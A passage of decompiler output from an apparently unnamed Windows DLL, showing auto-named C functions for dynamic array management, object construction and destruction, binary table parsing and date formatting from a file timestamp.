    v5 = v3[1];
    *(_DWORD *)a2 = v4;
    *(_DWORD *)(a2 + 4) = v5;
  }
  return a2;
}

//----- (1003D74B) --------------------------------------------------------
bool __userpurge sub_1003D74B@<al>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // esi
  bool result; // al
  int v7[7]; // [esp+10h] [ebp-1Ch] BYREF

  memset(v7, 0, 24);
  v5 = a2 + 64;
  result = sub_1004B47E((char *)(a2 + 64), *(_DWORD *)(a3 + 8), *(_DWORD *)(a3 + 12), v7)
        && (sub_1004B684(v5, (int)v7, a1), *(_BYTE *)(a1[1] + 8) = 1, a1[3] >= 8u)
        && sub_1003C819(a1, a4) != 0;
  return result;
}

//----- (1003D7B0) --------------------------------------------------------
char __userpurge sub_1003D7B0@<al>(int a1@<esi>, int a2, int a3, _DWORD *a4, int a5, int a6)
{
  unsigned int v6; // eax
  unsigned __int16 *v7; // eax
  unsigned int v8; // ebx
  unsigned __int16 *v10; // eax
  unsigned int v11; // edi
  int v12; // eax
  unsigned int i; // edi
  _DWORD *v14; // eax
  int v15; // [esp+Ch] [ebp-10h]
  int v16; // [esp+10h] [ebp-Ch]
  unsigned int v17; // [esp+14h] [ebp-8h] BYREF

  v6 = sub_1000B6F2(a4, 4);
  v7 = (unsigned __int16 *)(*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)a1 + 48))(a1, v6 >> 5);
  v8 = (unsigned int)sub_1000B6F2(a4, *v7 + 4) >> 5;
  if ( (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) <= v8 )
    return 0;
  v10 = (unsigned __int16 *)(*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)a1 + 48))(a1, v8);
  v11 = a4[3];
  v17 = *v10;
  if ( v11 <= *(unsigned __int16 *)((*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)a1 + 48))(a1, v8) + 2) )
    return 0;
  v12 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)a1 + 48))(a1, v8);
  for ( i = v17; i < *(unsigned __int16 *)(v12 + 2); i += 8 )
  {
    LOWORD(v15) = sub_1000B746(a4, i + 2);
    v16 = sub_1000B6F2(a4, i + 4);
    v17 = (unsigned __int16)sub_1000B746(a4, i);
    v14 = (_DWORD *)(*(int (__thiscall **)(int, unsigned int *))(*(_DWORD *)a5 + 16))(a5, &v17);
    *v14 = v15;
    v14[1] = v16;
    v12 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)a1 + 48))(a1, v8);
  }
  if ( *(_QWORD *)(a3 + 16) )
    sub_1004BC40((int *)a3, a2 + 64, a6);
  return 1;
}
// 1003D86A: variable 'v15' is possibly undefined

//----- (1003D8A7) --------------------------------------------------------
char __stdcall sub_1003D8A7(int a1, int a2, int a3)
{
  char v4; // bl
  LONG *v5; // eax
  _DWORD v6[9]; // [esp+10h] [ebp-9Ch] BYREF
  _DWORD v7[9]; // [esp+34h] [ebp-78h] BYREF
  int v8[8]; // [esp+58h] [ebp-54h] BYREF
  int v9[5]; // [esp+78h] [ebp-34h] BYREF
  _DWORD v10[7]; // [esp+8Ch] [ebp-20h] BYREF
  int v11; // [esp+A8h] [ebp-4h]

  memset(v8, 0, sizeof(v8));
  if ( !sub_1004BFBD(a2, (_DWORD *)(a1 + 64), v8) )
    return 0;
  sub_1000B1F3(0, (int)v9, 0);
  v11 = 0;
  sub_1003E47E(v10);
  LOBYTE(v11) = 1;
  if ( !sub_1003D74B(v9, a1, (int)v8, (int)v10) )
  {
    LOBYTE(v11) = 0;
    sub_1003E4D0((int)v10);
    v11 = -1;
    sub_1000B3DF(v9);
    return 0;
  }
  sub_1003EC22(v6);
  LOBYTE(v11) = 2;
  sub_1003E71F(v7);
  LOBYTE(v11) = 3;
  if ( sub_1003D7B0((int)v10, a1, a2, v9, (int)v6, (int)v7) )
  {
    v5 = (LONG *)sub_1003D53E(a1, &v8[3], v9, 1, (int)v6, v10, (int)v7);
    LOBYTE(v11) = 4;
    sub_1000B3BD(v5, a3);
    LOBYTE(v11) = 3;
    sub_1000B3DF(&v8[3]);
    v4 = 1;
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v11) = 2;
  sub_1003E765(v7);
  LOBYTE(v11) = 1;
  sub_1003EC9D(v6);
  LOBYTE(v11) = 0;
  sub_1003E4D0((int)v10);
  v11 = -1;
  sub_1000B3DF(v9);
  return v4;
}
// 1003D8A7: using guessed type int var_34[5];
// 1003D8A7: using guessed type _DWORD var_20[7];
// 1003D8A7: using guessed type _DWORD var_9C[9];
// 1003D8A7: using guessed type _DWORD var_78[9];

//----- (1003D9EE) --------------------------------------------------------
void *__thiscall sub_1003D9EE(void *this, int a2, void *a3, _DWORD *a4, char a5, void *a6, int a7)
{
  _DWORD *v7; // esi
  wchar_t *v8; // eax
  int v9; // eax
  size_t v10; // eax
  int wDay; // [esp-18h] [ebp-60h]
  int wMonth; // [esp-14h] [ebp-5Ch]
  int wYear; // [esp-10h] [ebp-58h]
  int wHour; // [esp-Ch] [ebp-54h]
  int wMinute; // [esp-8h] [ebp-50h]
  int wSecond; // [esp-4h] [ebp-4Ch]
  void *v18; // [esp-4h] [ebp-4Ch]
  struct _SYSTEMTIME SystemTime; // [esp+10h] [ebp-38h] BYREF
  int v20[2]; // [esp+20h] [ebp-28h] BYREF
  FILETIME FileTime; // [esp+28h] [ebp-20h] BYREF
  int v22[2]; // [esp+30h] [ebp-18h] BYREF
  int v23; // [esp+38h] [ebp-10h]
  int v24; // [esp+44h] [ebp-4h]

  v23 = 0;
  sub_1003D660(this, a2, &FileTime, a4, a5, a6, a7);
  memset(&SystemTime, 0, sizeof(SystemTime));
  if ( !FileTimeToSystemTime(&FileTime, &SystemTime) )
    memset(&SystemTime, 0, sizeof(SystemTime));
  v7 = sub_1000D17D(v20, &word_10175B30);
  v24 = 1;
  wSecond = SystemTime.wSecond;
  wMinute = SystemTime.wMinute;
  wHour = SystemTime.wHour;
  wYear = SystemTime.wYear;
  wMonth = SystemTime.wMonth;
  wDay = SystemTime.wDay;
  v8 = (wchar_t *)sub_1000CC40((int)&unk_10175B38);
  v9 = sub_1000D6C3((int)v7, v8, wDay, wMonth, wYear, wHour, wMinute, wSecond);
  sub_1000D372(v22, v9);
  LOBYTE(v24) = 3;
  sub_1000D3AD(v20);
  v18 = *(void **)(v22[1] + 12);
  v10 = sub_1000D687((int)v22);
  sub_1000B1F3((void *)(2 * v10), (int)a3, v18);
  v23 = 1;
  LOBYTE(v24) = 0;
  sub_1000D3AD(v22);
  return a3;
}

//----- (1003DAD8) --------------------------------------------------------
_DWORD *__thiscall sub_1003DAD8(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x28u);
  if ( v3 )
    v4 = sub_1003DCEE(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (1003DB49) --------------------------------------------------------
_DWORD *__thiscall sub_1003DB49(void *this, _DWORD *a2, void *Block)
{
  unsigned int v4; // eax
  void *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  v5 = Block;
  if ( (unsigned int)Block > v4 )
  {
    v6 = sub_1000E8EF(&Block);
    sub_100078FE((int)v6);
  }
  v7 = operator new(0xCu);
  Block = v7;
  if ( v7 )
  {
    v7[1] = this;
    *v7 = &off_10103A90;
    v7[2] = v5;
  }
  else
  {
    v7 = 0;
  }
  sub_10039112(a2, (int)v7);
  return a2;
}
// 10103A90: using guessed type int (__thiscall *off_10103A90)(void *Block, char);

//----- (1003DBCA) --------------------------------------------------------
_DWORD *__thiscall sub_1003DBCA(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x38u);
  if ( v3 )
    v4 = sub_1003DD98(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (1003DC3B) --------------------------------------------------------
_DWORD *__thiscall sub_1003DC3B(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x1Cu);
  if ( v3 )
  {
    v3[1] = this;
    *v3 = &off_10103EEC;
    v3[2] = off_10103CC0;
    v3[6] = 0;
    v4 = v3;
  }
  else
  {
    v4 = 0;
  }
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}
// 10103CC0: using guessed type int (__thiscall *off_10103CC0[2])(void *Block, char);
// 10103EEC: using guessed type int (__stdcall *off_10103EEC)(char);

//----- (1003DCC0) --------------------------------------------------------
int __thiscall sub_1003DCC0(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1003DCEE) --------------------------------------------------------
_DWORD *__stdcall sub_1003DCEE(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10103EAC;
  a1[2] = off_10103D3C;
  sub_1000B1F3(0, (int)(a1 + 4), 0);
  a1[9] = 0;
  return a1;
}
// 10103D3C: using guessed type int (__thiscall *off_10103D3C[2])(void *Block, char);
// 10103EAC: using guessed type int (__stdcall *off_10103EAC)(char);

//----- (1003DD3A) --------------------------------------------------------
_DWORD *__thiscall sub_1003DD3A(_DWORD *this)
{
  _DWORD *v2; // eax
  LONG *v3; // eax
  int v5; // [esp-4h] [ebp-10h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[9]);
  v5 = this[9];
  this[3] = *v2;
  v3 = (LONG *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, v5);
  sub_1000B3BD(v3, (int)(this + 4));
  return this + 2;
}

//----- (1003DD71) --------------------------------------------------------
void __thiscall sub_1003DD71(int *this)
{
  *this = (int)off_10103D3C;
  sub_1000B3DF(this + 2);
}
// 10103D3C: using guessed type int (__thiscall *off_10103D3C[2])(void *Block, char);

//----- (1003DD98) --------------------------------------------------------
_DWORD *__stdcall sub_1003DD98(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10103ECC;
  a1[2] = &off_10103E48;
  sub_1000B1F3(0, (int)(a1 + 6), 0);
  a1[12] = 0;
  return a1;
}
// 10103E48: using guessed type int (__thiscall *off_10103E48)(void *Block, char);
// 10103ECC: using guessed type int (__stdcall *off_10103ECC)(char);

//----- (1003DDE4) --------------------------------------------------------
BOOL __thiscall sub_1003DDE4(int this)
{
  return *(_DWORD *)(this + 48) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003DDF7) --------------------------------------------------------
BOOL __thiscall sub_1003DDF7(_DWORD *this)
{
  return this[12] != 0;
}

//----- (1003DE01) --------------------------------------------------------
_DWORD *__thiscall sub_1003DE01(_DWORD *this)
{
  _DWORD *v2; // eax
  LONG *v3; // eax
  int v5; // [esp-4h] [ebp-10h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[12]);
  v5 = this[12];
  this[4] = *v2;
  this[5] = v2[1];
  v3 = (LONG *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, v5);
  sub_1000B3BD(v3, (int)(this + 6));
  return this + 2;
}

//----- (1003DE3E) --------------------------------------------------------
void __thiscall sub_1003DE3E(_DWORD *this)
{
  ++this[12];
}

//----- (1003DE42) --------------------------------------------------------
void __thiscall sub_1003DE42(_DWORD *this)
{
  --this[12];
}

//----- (1003DE46) --------------------------------------------------------
void __thiscall sub_1003DE46(int *this)
{
  *this = (int)&off_10103E48;
  sub_1000B3DF(this + 4);
}
// 10103E48: using guessed type int (__thiscall *off_10103E48)(void *Block, char);

//----- (1003DE6D) --------------------------------------------------------
BOOL __thiscall sub_1003DE6D(int this)
{
  return *(_DWORD *)(this + 24) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003DE80) --------------------------------------------------------
_DWORD *__thiscall sub_1003DE80(_DWORD *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  int v5; // [esp-4h] [ebp-8h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[6]);
  v5 = this[6];
  this[3] = *v2;
  v3 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, v5);
  this[4] = *v3;
  this[5] = v3[1];
  return this + 2;
}

//----- (1003DEB4) --------------------------------------------------------
int *__thiscall sub_1003DEB4(int *this, char a2)
{
  sub_1003DD71(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1003DEE8) --------------------------------------------------------
int *__thiscall sub_1003DEE8(int *Block, char a2)
{
  sub_1003DD71(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003DF04) --------------------------------------------------------
int *__thiscall sub_1003DF04(int *this, char a2)
{
  sub_1003DE46(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1003DF38) --------------------------------------------------------
int *__thiscall sub_1003DF38(int *Block, char a2)
{
  sub_1003DE46(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003DF54) --------------------------------------------------------
_DWORD *__thiscall sub_1003DF54(_DWORD *this, char a2)
{
  this[2] = off_10103CC0;
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}
// 10103CC0: using guessed type int (__thiscall *off_10103CC0[2])(void *Block, char);

//----- (1003DF87) --------------------------------------------------------
void __thiscall sub_1003DF87(int this)
{
  *(_DWORD *)this = &off_10103D40;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 10103D40: using guessed type int (__thiscall *off_10103D40)(void *Block, char);

//----- (1003DFD6) --------------------------------------------------------
int __thiscall sub_1003DFD6(_DWORD *this, int *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  int v9; // [esp+14h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10132A5E);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = v9;
  ++this[1];
  return result;
}

//----- (1003E039) --------------------------------------------------------
int __thiscall sub_1003E039(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1003E051) --------------------------------------------------------
int __thiscall sub_1003E051(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10132A5F);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1003E09A) --------------------------------------------------------
int __thiscall sub_1003E09A(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10132BFE);
  return this[3] + 4 * a2;
}

//----- (1003E0B8) --------------------------------------------------------
int __thiscall sub_1003E0B8(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10132BFF);
  return this[3] + 4 * a2;
}

//----- (1003E0D6) --------------------------------------------------------
int __thiscall sub_1003E0D6(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1003E115) --------------------------------------------------------
unsigned int __thiscall sub_1003E115(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10132CD2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1003E187) --------------------------------------------------------
void __thiscall sub_1003E187(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}

//----- (1003E23D) --------------------------------------------------------
void __thiscall sub_1003E23D(_DWORD *this)
{
  *this = &off_10103D00;
  sub_1003A4CE(this + 5);
  sub_1003DF87((int)(this + 1));
  sub_10039F05(this);
}
// 10103D00: using guessed type int (__thiscall *off_10103D00)(void *Block, char);

//----- (1003E280) --------------------------------------------------------
bool __thiscall sub_1003E280(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1003EFBD(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (1003E2B7) --------------------------------------------------------
char __thiscall sub_1003E2B7(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1003EFBD(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1003E304) --------------------------------------------------------
int __thiscall sub_1003E304(_DWORD *this, _DWORD *a2)
{
  int v3; // edi
  int v4; // eax
  int v6[7]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  v3 = sub_1003EFBD(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, a2, v3);
    v4 = sub_1000B1F3(0, (int)v6, 0);
    v7 = 0;
    (*(void (__thiscall **)(_DWORD *, int, int))(this[5] + 32))(this + 5, v4, v3);
    v7 = -1;
    sub_1000B3DF(v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 1003E304: using guessed type int var_20[7];

//----- (1003E37E) --------------------------------------------------------
int __thiscall sub_1003E37E(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // esi
  int v4; // edi
  _DWORD *v6; // eax

  v3 = a2;
  v4 = sub_1003EFBD(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v3 )
  {
    v6 = sub_1000E8EF(&a2);
    sub_100078FE((int)v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1003E3DB) --------------------------------------------------------
_DWORD *__thiscall sub_1003E3DB(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 1;
  *a2 = off_100FBF5C;
  *a2 = &off_10103D40;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[1] + 4))(this + 1);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1003E6C2(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103D40: using guessed type int (__thiscall *off_10103D40)(void *Block, char);

//----- (1003E435) --------------------------------------------------------
_DWORD *__thiscall sub_1003E435(_DWORD *this, _DWORD *a2)
{
  sub_1003AD98(this + 5, a2);
  return a2;
}

//----- (1003E466) --------------------------------------------------------
int __thiscall sub_1003E466(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (1003E47E) --------------------------------------------------------
_DWORD *__stdcall sub_1003E47E(_DWORD *a1)
{
  *a1 = off_100FBF5C;
  a1[1] = 0;
  a1[2] = 16;
  *a1 = &off_10103DB0;
  a1[3] = operator new(0x40u);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103DB0: using guessed type int (__thiscall *off_10103DB0)(void *Block, char);

//----- (1003E4D0) --------------------------------------------------------
void __thiscall sub_1003E4D0(int this)
{
  *(_DWORD *)this = &off_10103DB0;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 10103DB0: using guessed type int (__thiscall *off_10103DB0)(void *Block, char);

//----- (1003E51F) --------------------------------------------------------
int __thiscall sub_1003E51F(_DWORD *this, int *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  int v9; // [esp+14h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10132EEA);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = v9;
  ++this[1];
  return result;
}

//----- (1003E582) --------------------------------------------------------
int __thiscall sub_1003E582(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10132EEB);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = dword_10193D34;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193D34: using guessed type int dword_10193D34;

//----- (1003E5D0) --------------------------------------------------------
int __thiscall sub_1003E5D0(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10132FBE);
  return this[3] + 4 * a2;
}

//----- (1003E5EE) --------------------------------------------------------
int __thiscall sub_1003E5EE(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10132FBF);
  return this[3] + 4 * a2;
}

//----- (1003E60C) --------------------------------------------------------
int __thiscall sub_1003E60C(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = dword_10193D34;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 10193D34: using guessed type int dword_10193D34;

//----- (1003E650) --------------------------------------------------------
unsigned int __thiscall sub_1003E650(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10133062);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1003E6C2) --------------------------------------------------------
unsigned int __thiscall sub_1003E6C2(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1003E71F) --------------------------------------------------------
_DWORD *__stdcall sub_1003E71F(_DWORD *a1)
{
  *a1 = off_100FBF5C;
  *a1 = &off_10103CC4;
  sub_1003EEF5(a1 + 1);
  sub_1003EF32(a1 + 5);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103CC4: using guessed type int (__thiscall *off_10103CC4)(void *Block, char);

//----- (1003E765) --------------------------------------------------------
void __thiscall sub_1003E765(_DWORD *this)
{
  *this = &off_10103CC4;
  sub_1003A4CE(this + 5);
  sub_1001584F((int)(this + 1));
